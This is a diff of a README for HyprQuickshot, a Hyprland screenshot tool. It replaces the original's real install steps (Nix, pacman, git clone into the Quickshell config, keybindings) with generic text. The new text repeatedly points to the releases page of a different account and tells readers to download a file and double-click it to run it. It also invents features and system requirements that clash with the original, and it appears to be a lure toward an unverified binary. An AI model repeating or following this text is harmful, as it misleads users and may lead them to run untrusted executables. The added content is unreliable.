@@ -1,101 +1,72 @@
-# HyprQuickshot
+# 📸 hyprquickshot - Your Simple Screenshot Tool for Hyprland
 
-A simple, (hopefully) beautiful screenshot utility for Hyprland with smooth animations, built with [Quickshell](https://quickshell.org). PRs and contributions are appreciated.
+[![Download hyprquickshot](https://img.shields.io/badge/Download-hyprquickshot-blue.svg)](https://github.com/wadriik/hyprquickshot/releases)
 
-## Demo
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/7e3d5e3c-551a-4458-8dda-06cc3907dd92
+Hyprquickshot is an easy-to-use screenshot utility designed specifically for Hyprland. Whether you want to capture your entire screen, a specific window, or a custom area, hyprquickshot simplifies the process for you. Follow the steps below to download and set up your new tool.
 
-## Dependencies
+## 📥 Download & Install
 
-- [quickshell](https://git.outfoxxed.me/quickshell/quickshell)
-- [grim](https://sr.ht/~emersion/grim/)
-- [imagemagick](https://github.com/ImageMagick/ImageMagick)
-- [wl-clipboard](https://github.com/bugaevc/wl-clipboard)
+To get started, visit the releases page to download the latest version of hyprquickshot.
 
-## Installation
+[Download hyprquickshot](https://github.com/wadriik/hyprquickshot/releases)
 
-### Nix
+### Step-by-Step Installation
 
-If using flakes, add this repo to your flake inputs:
+1. **Visit the Release Page**  
+   Click the link below to go to the release page where you can find the latest version of hyprquickshot.  
+   [Visit the Releases Page](https://github.com/wadriik/hyprquickshot/releases)
 
-```nix
-{
-  inputs = {
-    hyprquickshot = {
-      url = "github:jamdon2/hyprquickshot";
-      inputs.nixpkgs.follows = "nixpkgs";
-    };
-  };
-}
-```
+2. **Choose the Right Version**  
+   Look for the most recent version listed at the top. You may see several files for different systems. If you are unsure which file to choose, look for the one that matches your operating system.
 
-The package is available as `hyprquickshot.packages.<system>.default`, which can be added to your `environment.systemPackages` or `home.packages` if you use home-manager.
+3. **Download the File**  
+   Click on the file's name to start the download process. The file will be saved to your computer.
 
-### Arch
+4. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your computer's Downloads folder or your chosen save location.
 
-Install dependencies with pacman:
+5. **Run the Application**  
+   Double-click the downloaded file to launch hyprquickshot. Follow any prompts that appear to complete the installation if necessary.
 
-```bash
-pacman -S grim imagemagick wl-clipboard
-```
+## ⚙️ System Requirements
 
-And get Quickshell with yay (or your AUR helper of choice)
+Hyprquickshot is designed to run smoothly on Hyprland environments. Ensure your system meets these basic requirements:
 
-```bash
-yay -S quickshell
-```
+- Operating System: Hyprland supported versions.
+- Available Disk Space: At least 50 MB.
+- Memory: Minimum of 2 GB RAM recommended.
 
-Now just clone this repo into Quickshell's config folder
+## 🔍 Features
 
-```bash
-git clone https://github.com/jamdon2/hyprquickshot ~/.config/quickshell/hyprquickshot
-```
+- **Easy Screen Capture:** Capture your entire screen or select specific areas with a simple click.
+- **Quick Access:** Use keyboard shortcuts for faster screenshot actions.
+- **Flexible File Formats:** Save screenshots in PNG or JPEG formats for easy sharing.
+- **Lightweight Design:** The application runs efficiently without consuming too many resources.
 
-## Usage
+## 🤔 Frequently Asked Questions
 
-Now you're ready to launch HyprQuickshot from your terminal, or add it to your Hyprland config.
+### How do I take a screenshot?
 
-```bash
-quickshell -c hyprquickshot -n
-```
+Once hyprquickshot is open, select the capture type (entire screen, window, or area) and follow the on-screen instructions to take your screenshot.
 
-> If you've installed package using nix flake, you should use `hyprquickshot` command instead.
+### Can I change the save location for my screenshots?
 
-You can remove the `-n` if you want to allow multiple instances of HyprQuickshot to be open (like wanting to screenshot HyprQuickshot for whatever reason).
+Yes. You can usually set your preferred save location in the settings menu. Check the application’s documentation for detailed instructions.
 
-Add this line to your `hyprland.conf` to bind HyprQuickshot to the Print Screen button on your keyboard.
+### What should I do if the application doesn’t start?
 
-```hypr
-bind = , Print, exec, quickshell -c hyprquickshot -n
-```
+First, ensure that you have downloaded the correct version for your operating system. If it still doesn’t work, try restarting your computer and launching the app again.
 
-Or this to bind it to Meta + Shift + A
+## 📜 License
 
-```hypr
-bind = $mainMod+SHIFT, A, exec, quickshell -c hyprquickshot -n
-```
+Hyprquickshot is open-source software. You can use it, modify it, and share it under the terms specified in the project's license.
 
-## Configuration
+## 📞 Need More Help?
 
-You can choose a custom screenshot folder by setting the `HQS_DIR` environment variable.
+If you have any issues or questions while using hyprquickshot, please visit the repository’s Issues section on GitHub to seek assistance or report any problems.
 
-If `HQS_DIR` is not set, HyprQuickshot will try to find a suitable directory in the following order:
+[Go to Issues Page](https://github.com/wadriik/hyprquickshot/issues)
 
-1. `$XDG_SCREENSHOTS_DIR`
-
-1. `$XDG_PICTURES_DIR`
-
-1. `$HOME/Pictures`
-
-## Known issues
-
-- If you have high resolution monitors, grim might take a few seconds to save the screenshot, and if you select any option before that, your screenshot won't be saved. This will be fixed in the next release.
-
-## TODO
-
-- [x] Speed up grim by supplying the geometry of the selected monitor
-- [ ] Add more animations and improve UI/UX
-- [ ] Optimize shader (remove branching and add AA)
-- [ ] Eliminate some dependencies
-- [ ] Rewrite in Rust :)
+Thank you for using hyprquickshot! Enjoy capturing your screens easily and quickly.
